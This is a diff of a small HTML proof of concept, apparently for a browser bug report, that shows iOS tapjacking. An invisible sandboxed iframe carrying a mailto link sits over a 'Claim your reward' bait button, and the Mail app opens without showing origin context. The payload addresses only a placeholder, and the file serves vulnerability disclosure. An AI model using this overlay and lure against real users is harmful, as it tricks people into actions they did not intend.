@@ -1,20 +1,50 @@
 <!DOCTYPE html>
 <html>
-<body>
-<h3>iOS Tel Protocol SpoOF PoC</h3>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>iOS Mailto Tapjacking PoC</title>
+<style>
+body {
+  font-family: sans-serif;
+}
+#bait {
+  width: 100%;
+  height: 80px;
+  background: #4CAF50;
+  color: white;
+  font-size: 22px;
+  text-align: center;
+  line-height: 80px;
+  margin-top: 50px;
+}
+iframe {
+  position: absolute;
+  top: 50px;
+  left: 0;
+  width: 100%;
+  height: 80px;
+  opacity: 0.01; /* invisible overlay */
+  border: none;
+}
+</style>
+</head>
 
-<iframe sandbox="allow-scripts"
-        srcdoc="
-          <button onclick='location.href=`tel:08123456789`'>
-            Call from sandboxed iframe
-          </button>
-        "
-        style="width:100%;height:150px;border:1px solid red">
+<body>
+
+<h3>Claim your reward 🎁</h3>
+
+<div id="bait">Tap here to continue</div>
+
+<iframe sandbox
+srcdoc="
+<a href='mailto:test@example.com?subject=Hello&body=Tapped%20from%20iOS'
+   style='display:block;width:100%;height:100%'></a>
+">
 </iframe>
 
 <p>
-Expected: show github.io origin  
-Actual (iOS): no origin / about:blank
+Expected: user taps green button  
+Actual (iOS): Mail app opens without origin context
 </p>
 
 </body>
